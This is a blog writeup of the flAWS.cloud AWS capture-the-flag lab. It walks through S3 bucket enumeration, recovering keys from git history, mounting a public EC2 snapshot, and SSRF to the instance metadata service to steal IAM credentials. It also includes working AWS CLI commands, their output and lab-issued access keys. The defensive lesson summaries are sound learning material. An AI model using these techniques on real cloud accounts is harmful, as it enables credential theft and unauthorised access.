---
title: 'flAWS.cloud'
date: 2023-01-29
description: 'Writeup for a beginner AWS CTF.'
---

[flAWS](http://flaws.cloud/)

## Level 1

> **Scope**: Everything is run out of a single AWS account, and all challenges are sub-domains of [flaws.cloud](http://flaws.cloud/).

With this kind of scope, flaws.cloud is positioned in a similar way to an external assessment. I'll start by doing some recon on that domain.

```text
wsl@fronkle:~$ nslookup flaws.cloud
Server:         192.168.16.1
Address:        192.168.16.1#53

Non-authoritative answer:
Name:   flaws.cloud
Address: 52.92.209.139
Name:   flaws.cloud
Address: 52.92.180.171
Name:   flaws.cloud
Address: 52.92.210.179
Name:   flaws.cloud
Address: 52.218.178.82
Name:   flaws.cloud
Address: 52.92.212.179
Name:   flaws.cloud
Address: 52.218.217.26
Name:   flaws.cloud
Address: 52.218.179.59
Name:   flaws.cloud
Address: 52.218.245.147
```

These addresses are all from an AWS hosted CIDR block, as you'd expect. A `whois` lookup doesn't provide anything valuable, at least that I'm aware. Next, I ran the domain through amass with the command `amass enum -active -brute -d flaws.cloud -o amass.txt`. 

While that ran, I did some manual reconneissance. Since the `flaws.cloud` domain resolves to AWS addresses, I gleaned that the website itself is hosted via AWS. 

Navigating to one of these IPs, `52.92.209.139`, directs me to [Cloud Object Storage – Amazon S3 – Amazon Web Services](https://aws.amazon.com/s3/). This tells me that the site is probably hosted on S3. 

According to [AWS - S3 Unauthenticated Enum - HackTricks Cloud](https://cloud.hacktricks.xyz/pentesting-cloud/aws-pentesting/aws-unauthenticated-enum-access/aws-s3-unauthenticated-enum), a bucket name must be the same as its domain name. I'm not entirely sure what that means, and I'd like to dig into Amazon's S3 documentation further. Regardless, I check `s3.amazonaws.com/flaws.cloud` and sure enough, the bucket responds with a redirect to `flaws.cloud.s3.amazonaws.com`. 

It lists the different endpoints for the site, including a secret endpoint: `secret-dd02c7c.html`.

![XML directory listing for bucket including secret html endpoint](../../../assets/writeups/flaws.cloud/Pasted_image_20230122221315.png)

Navigating to that endpoint marks the end of the first level, and directs me to level 2. 

![Endpoint that tells you the subdirectory of the next level](../../../assets/writeups/flaws.cloud/Pasted_image_20230122221356.png)

By the way, amass ended up revealing the following subdomains:

```text
level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
```

I'll just pretend I don't have those for the rest of this CTF. My primary goal here is to learn more about AWS hacking.

### Lessons Learned

The level 2 page talks about what made the misconfiguration that made the first level possible. S3 buckets have a permission property called "List." Whoever is granted this permission is able to see a list of the contents of the S3 bucket. 

When this permission is granted to "Everyone" it enables anyone on the internet to view this list, regardless of their permission to read/write the contents of that bucket.

1. When an IP is owned by Amazon, navigate to that IP to potentially get information about the service associated with it. In this case it directed us to Amazon's S3 home page.
2. Navigating to `s3.amazonaws.com/[name]` or `[name].s3.amazonaws.com` can tell you if a bucket is associated with that name. In this case we used `flaws.cloud` to check for the bucket associated with that domain.
3. Navigating to the aforementioned endpoint or subdomain will list the bucket contents if the "List" permission is enabled for "Everyone."

## Level 2

Level 2 says that it's similar to level 1, but requires an authenticated AWS account. So, I made one, and I made a user for CTFs such as these to avoid using the root account.

![Me calling aws sts get-caller-identity](../../../assets/writeups/flaws.cloud/Pasted_image_20230122224522.png)

I run  `aws s3 ls s3://flaws.cloud` to get started with the level, it outputs the following content.

```text
wsl@fronkle:~$ aws s3 ls s3://flaws.cloud
2017-03-13 22:00:38       2575 hint1.html
2017-03-02 22:05:17       1707 hint2.html
2017-03-02 22:05:11       1101 hint3.html
2020-05-22 13:16:45       3162 index.html
2018-07-10 11:47:16      15979 logo.png
2017-02-26 19:59:28         46 robots.txt
2017-02-26 19:59:30       1051 secret-dd02c7c.html
```

I stared at this for a second before realizing I'm dumb and I'm on the second level, so I need to use the second level's subdomain: `level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`.

So take two, `aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`. 

```text
wsl@fronkle:~$ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 20:02:15      80751 everyone.png
2017-03-02 21:47:17       1433 hint1.html
2017-02-26 20:04:39       1035 hint2.html
2017-02-26 20:02:14       2786 index.html
2017-02-26 20:02:14         26 robots.txt
2017-02-26 20:02:15       1051 secret-e4443fc.html
```

I navigate to `secret-e4443fc.html`, and that's the end of the level.

![Endpoint that tells you the subdirectory of the next level](../../../assets/writeups/flaws.cloud/Pasted_image_20230122225108.png)

For reference, if I had navigated to `level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.s3.amazonaws.com`, like in the first level, I would have gotten this access denied response. 

![XML showing access denied](../../../assets/writeups/flaws.cloud/Pasted_image_20230122225224.png)

As the level 3 page explains, this is because "List" permissions are not enabled for "Everyone," but rather for "Any Authenticated AWS User." That's why I needed to access the bucket from the command line, or any other place where AWS can recognize me as an authenticated user.

### Lessons Learned

1. If `[name].s3.amazonaws.com` doesn't work, try checking it out from the AWS CLI as an authenticated user. In this case  `aws s3 ls s3://[name]` worked because they'd enabled "List" access for all authenticated AWS users.
2. According to the level 3 page, the "Any Authenticated AWS User" permission isn't available in the AWS webconsole anymore. However, the AWS SDK and some third-party tools still let you use that setting.

## Level 3

Doing `aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud` this time reveals a `.git` folder. 

```text
wsl@fronkle:~/ctfs/flaws/level3-bucket$ aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
                           PRE .git/
2017-02-26 18:14:33     123637 authenticated_users.png
2017-02-26 18:14:34       1552 hint1.html
2017-02-26 18:14:34       1426 hint2.html
2017-02-26 18:14:35       1247 hint3.html
2017-02-26 18:14:33       1035 hint4.html
2020-05-22 13:21:10       1861 index.html
2017-02-26 18:14:33         26 robots.txt
```

It looks like they want me to grab something from a previous commit, or something of that nature, so I use `aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud level3_bucket` to pull down the entire bucket to the `level3_bucket` folder on my machine.

I then use `git log` and see a very inconscipicuous commit message.

```text
wsl@fronkle:~/ctfs/flaws/level3-bucket$ git log
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

I switch to the first commit with `git checkout` and find a file called `access_keys.txt`. 

```text
wsl@fronkle:~/ctfs/flaws/level3-bucket$ cat access_keys.txt
access_key AKIA<!--censored-->SA
secret_access_key OdNa<!--censored-->83Jys
```

I do `aws configure` to switch to the user that these access keys let me authenticate as.

```text
wsl@fronkle:~/ctfs/flaws/level3-bucket$ aws sts get-caller-identity
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```

The command `aws s3api list-buckets` lets me list all buckets this user has access to under its account. It reveals a ton of buckets. 

![Long list of buckets including current and future level's](../../../assets/writeups/flaws.cloud/Pasted_image_20230122232411.png)

This gives me the address for the fourth level, so I navigate there.

### Lessons Learned

- Just like with traditional web directory fuzzing, an S3 bucket can hold unintentionally publicized secrets. In this case, a git configuration folder was included, which allowed me to view old commits that had not been properly redacted.
- AWS does not let you restrict which buckets are displayed when it gives permission for `s3api list-buckets`. It's an all-or-nothing deal. 

## Level 4

Level 4 asks me to "get access" to the web page running on an EC2 instance at the following domain: `4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`. 

They also give somewhat of a hint by saying:

> It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.

When I navigate to the domain in my browser, it displays a `401 Unauthorized` error. 

![standard nginx 401 page](../../../assets/writeups/flaws.cloud/Pasted_image_20230125115234.png)

Given that an EC2 instance is basically just a virtual machine, I run `nmap` against it with `nmap -p- -oN ctfs/flaws/l4.nmap 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud -vvv`. It returns that ports `80`, and `22` are open. This is pretty standard for EC2 instances; they keep a web port open to host a website, and the `ssh` port open for remote access and management.

With the checking of ports finished, it's time to look at the EC2 instance from an AWS perspective. The EC2 command `describe-snapshots` acts at a public scale, which means if the permission on a snapshot are misconfigured, anyone in the world could look at that snapshot.

The full command looks like: 

> `aws ec2 describe-snapshots --region us-west-2 --restorable-by-user-ids all | jq '.Snapshots[] | select(.OwnerId == "975426262029")'`. 

 - The `OwnerId` here is the account number, which I got last level from doing `aws sts get-caller-identity` while configured as the compromised user.
 - I determined the AWS `region` by referring to this https://ip-ranges.amazonaws.com/ip-ranges.json list of IP ranges, which is provided by Amazon. I determined the EC2 instance's IP by performing a DNS lookup on its domain. In this case, `nmap` resolved it for me when I ran the scan.

To learn about this list, and find the correct region for the EC2 instance's IP, which is `35.165.182.7` by the way, I referenced this Stack Overflow question: [python - Determine AWS Region from IP Address? - Stack Overflow](https://stackoverflow.com/questions/45441865/determine-aws-region-from-ip-address).

I co-opted the script from the top answer and modified it to reference the IP range JSON via a web request, rather than looking for it locally. Here's the full code for that:

```python
from ipaddress import ip_network, ip_address
import requests
import json
import sys

def find_aws_region(ip):
  response = requests.get('https://ip-ranges.amazonaws.com/ip-ranges.json')
  ip_json = response.json()
  # ip_json = json.load(open('ip-ranges.json'))
  prefixes = ip_json['prefixes']
  my_ip = ip_address(ip)
  region = 'Unknown'
  for prefix in prefixes:
    if my_ip in ip_network(prefix['ip_prefix']):
      region = prefix['region']
      break
  return region

def main():
    ip = sys.argv[1]
    print(find_aws_region(ip))

if __name__ == '__main__':
    main()
```

I ran it, and it gave the following output:

```text
wsl@fronkle:~/ctfs/flaws$ python3 find_aws_region.py 35.165.182.7
us-west-2
```

So finally, looking back at that command, `aws ec2 describe-snapshots --region us-west-2 --restorable-by-user-ids all | jq '.Snapshots[] | select(.OwnerId == "975426262029")'`, I run it to get the `SnapshotId` of `snap-0b49342abd1bdcb89`. This was run as my own user, not the compromised user.

![Output of aforementioned command, showcasing the snapshot-id field](../../../assets/writeups/flaws.cloud/Pasted_image_20230125130025.png)

I'm able to find this snapshot in the AWS console by going to `ec2 > snapshots` and filtering by the snapshot id. Make sure to set your region to `us-west-2`. 

![AWS Web console snapshots search page](../../../assets/writeups/flaws.cloud/Pasted_image_20230125131108.png)

From here I followed these steps to download a VMware compatible file based on this snapshot.

1. Made a copy of the snapshot in the AWS Web Console.
2. Created an AMI image based on that snapshot in the AWS Web Console.
3. Set up a role to import/export VMs in my AWS account, following these instructions: [Required permissions for VM Import/Export - VM Import/Export (amazon.com)](https://docs.aws.amazon.com/vm-import/latest/userguide/required-permissions.html#vmimport-role)
4. Followed these instructions to export the AMI image (VMDK format) into an S3 bucket that I own: [Exporting a VM directly from an Amazon Machine Image (AMI) - VM Import/Export](https://docs.aws.amazon.com/vm-import/latest/userguide/vmexport_image.html).
5. Once the conversion and export was finished, I downloaded the image to my local machine.

I followed the instructions in the replies of [this VMware forum post](https://communities.vmware.com/t5/ESXi-Discussions/getting-a-raw-hard-disk-image-into-a-VM/td-p/2708611). Then, I mounted the disk on my kali VM.

I found an nginx setup script in a user's home directory and it contained the password to access the website.

![Contents of a script on the mounted drive, a username and password combo](../../../assets/writeups/flaws.cloud/Pasted_image_20230125170226.png)

![Endpoint that tells you the subdirectory of the next level](../../../assets/writeups/flaws.cloud/Pasted_image_20230125170610.png)

### Lessons Learned

- EC2 and RDS snapshots can be enumerated without any authentication if their access restrictions are misconfigured. This is pertinent since EC2 snapshots are frequently used.
- If ever you gain access to a low-privilege AWS user, you may be able snapshot a running EC2 or RDS instance and then share it with your own AWS account, to then further inspect.
- AWS has a JSON of IP ranges they have provisioned, which can be referenced to find out what AWS region an IP is in. This list is [here](https://ip-ranges.amazonaws.com/ip-ranges.json), and the script to do so programatically is LINK-HERE. 

## Level 5

This level provides the [link to level 6](http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/), but navigating to it doesn't quite work. They say that there's a proxy on the previous level's EC2 instance. They provide some examples, showing how the link `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/`  loads the initial `flaws.cloud` domain.

Essentially, this means that the server is performing requests on our behalf. An interesting thing about EC2 instances is that they usually have access to a metadata server at the address `169.254.169.254`. This is present in many cloud services, not just AWS.

By making a request to `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws`, I'm able to retrieve this EC2 instance's IAM credentials. I determined this full URL path by manually navigating through each directory, starting at `/latest/meta-data/`, and modifying the path based on the subdirectory listings the application would return. 

![JSON including aws access key, secret key, and token](../../../assets/writeups/flaws.cloud/Pasted_image_20230125174108.png)

I load those credentials into my CLI AWS configuration, and am then able to read the bucket contents of the next level.

![Me doing the aws configure workflow and showing the contents of my ~/.aws/credentials file. Then running get-caller-identity to show that I'm the compromised role](../../../assets/writeups/flaws.cloud/Pasted_image_20230125174554.png)

```text
wsl@fronkle:~/ctfs/flaws$ aws --profile flaws5 s3 sync s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud flaws6
download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint1.html to flaws6/ddcc78ff/hint1.html
download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/index.html to flaws6/index.html
download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint2.html to flaws6/ddcc78ff/hint2.html
download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/index.html to flaws6/ddcc78ff/index.html
```

This tells me what subdirectory to navigate to to access level 6.

![The next level's home page](../../../assets/writeups/flaws.cloud/Pasted_image_20230125174911.png)

### Lessons Learned

- The ability to perform a Server-Side Request Forgery (SSRF) attack as an EC2 instance can be translated to AWS API access as that EC2 instance's IAM role or user. This is most easily done by checking the `http://169.254.169.254/latest/meta-data/` endpoint and, from there, navigating to the particular instance's instance-id page. 
	- See [CloudGoat AWS Scenario Walkthrough: “EC2_SSRF” (rhinosecuritylabs.com)](https://rhinosecuritylabs.com/cloud-security/cloudgoat-aws-scenario-ec2_ssrf/) for a great demonstration of this technique.
- AWS has introduced the IMSDv2 feature, which protects against this type of attack by requiring certain header parameters to be present in requests to the meta-data endpoint. However, many AWS EC2 instances do not have this protection enabled.

## Level 6

This level directly provides me with access as a particular user. They hint that this user has a policy named "SecurityAudit" attached to it, which means I'll probably be able to use a loose permission on it to perform some sort of privilege escalation or enumeration into the next level.

```text
Access key ID: AKIAJFQ6E7BY57Q3OBGA  
Secret: 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
```

I configure myself as that user then run `aws --profile flaws6 iam list-attached-user-policies --user-name Level6` to find the ARN of the sus policy.

Then, I use that ARN to find the policy version with `aws --profile flaws6 iam get-policy --policy arn:aws:iam::975426262029:policy/MySecurityAudit`. The version seems to be the default `v1`, so I then use `aws --profile flaws6 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit --version-id v1` to display the entire policy contents.

![Output of the aforementioned commands](../../../assets/writeups/flaws.cloud/Pasted_image_20230125181410.png)

I do the same thing for list_apigateways.

![Contents of list_apigateways policy](../../../assets/writeups/flaws.cloud/Pasted_image_20230125185031.png)

After going through each service and using the various `list` and `describe` commands to look for resources, I find a lambda function named `Level6`. The three lambda related permissions I'm allowed are:

```text
"lambda:GetAccountSettings",
"lambda:GetPolicy",
"lambda:List*",
```

I use the lambda `get-policy` command to view some additional information about this function.

```text
wsl@fronkle:~/ctfs/flaws$ aws --profile flaws6 lambda get-policy --function-name Level6
{
    "Policy": "{
	  "Version": "2012-10-17",
	  "Id": "default",
	  "Statement": [
		{
		  "Sid": "904610a93f593b76ad66ed6ed82c0a8b",
		  "Effect": "Allow",
		  "Principal": {
			"Service": "apigateway.amazonaws.com"
		  },
		  "Action": "lambda:InvokeFunction",
		  "Resource": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
		  "Condition": {
			"ArnLike": {
			  "AWS:SourceArn": "arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6"
			}
		  }
		}
	  ]
	}",
    "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b"
}
```

Lets break this down.

- `"Service": "apigateway.amazonaws.com"`: This is the service that is "Allow"-ed (`"Effect": "Allow",`) to perform the given action.
- `"Action": "lambda:InvokeFunction"`:  The action, in this case, is invoking the function.
- `"Resource": "arn:aws:lambda:us-west-2:975426262029:function:Level6"`: This is the resource that the service is allowed to take the `lambda:InvokeFunction` upon, so therefore the apigateway service is allowed to invoke the `Level6` function.
- `"AWS:SourceArn": "arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6"`:  This gives the following information:
	- The AWS region will be `us-west-2`.
	- The API ID will be `s33ppypa75`. 
	- The request method will be `GET`.
	- The `*` indicates that the API is likely to be behind a "Stage," which is the name AWS uses for different environments like "prod" or "test."

AWS has a standard URL format for API gateways: `https://{api_id}.execute-api.{region}.amazonaws.com/`.

Filling this out with the information from the function policy, our target will be `https://s33ppypa75.execute-api.us-west-2.amazonaws.com/{stageName}/Level6`.

The last piece we need is the stage name; I execute `get-stages` to find this out.

```text
wsl@fronkle:~/ctfs/flaws$ aws --profile flaws6 apigateway get-stages --rest-api-id s33ppypa75
{
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": 1488155168,
            "lastUpdatedDate": 1488155168
        }
    ]
}
```

So the stage name is `Prod`. And a request to `https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6` returns the final subdirectory to finish the CTF.

![Picture of webpage that says you reached the end of the CTF](../../../assets/writeups/flaws.cloud/Pasted_image_20230125192631.png)

### Lessons Learned

- Lambda functions can be exposed through AWS's API Gateway service, and there is a standard location for this service at `https://{api_id}.execute-api.{region}.amazonaws.com/`. 
- The API Gateway can be configured to support multiple "stages" for a given API. In this case only the "Prod" stage seemed to exist. 